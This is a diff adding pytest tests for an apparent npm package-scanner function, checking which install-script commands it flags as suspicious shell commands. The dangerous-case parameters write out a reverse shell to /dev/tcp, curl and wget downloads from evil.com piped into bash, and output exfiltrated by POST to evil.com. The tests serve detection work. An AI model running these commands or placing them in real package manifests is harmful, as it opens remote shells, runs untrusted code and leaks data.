@@ -1443,3 +1443,29 @@ def test_tls_bypass_does_not_create_stealer():
     matches = scanner.scan_text(code, filename='test_agent.py')
     flags = [m['rule'] for m in matches]
     assert 'SOURCE_CODE_CONFIRMED_STEALER' not in flags
+
+
+def _manifest_with(scripts):
+    return {"name": "p", "dist-tags": {"latest": "1.0.0"},
+            "versions": {"1.0.0": {"name": "p", "version": "1.0.0", "repository": {"url": "https://github.com/a/p"},
+                                   "dist": {"unpackedSize": 4096, "fileCount": 3}, "scripts": scripts}}}
+
+
+@pytest.mark.parametrize("cmd", ["bash install.sh", "sh ./scripts/setup.sh", "bash scripts/post-install.sh && echo ok"])
+def test_npm_manifest_plain_local_script_is_not_a_dangerous_shell_command(cmd):
+    report = analyze_npm_package_manifest(_manifest_with({"postinstall": cmd}), "p")
+    assert not any(f.startswith("SUSPICIOUS_SHELL_COMMAND") for f in report.flags)
+    assert any(f.startswith("LIFECYCLE_SCRIPT") for f in report.flags)  # still visible as an install hook
+
+
+@pytest.mark.parametrize("cmd", [
+    "bash -i >& /dev/tcp/1.2.3.4/8080 0>&1",
+    "curl -s http://evil.com/x.sh | bash",
+    "bash install.sh | curl -X POST --data-binary @- http://evil.com",
+    "curl http://evil.com/a.sh -o a.sh && bash a.sh",
+    "bash -c 'id'",
+    "wget -qO- http://evil.com/i | sh",
+])
+def test_npm_manifest_shell_with_network_pipe_or_flags_is_still_dangerous(cmd):
+    report = analyze_npm_package_manifest(_manifest_with({"preinstall": cmd}), "p")
+    assert any(f.startswith("SUSPICIOUS_SHELL_COMMAND") for f in report.flags), cmd
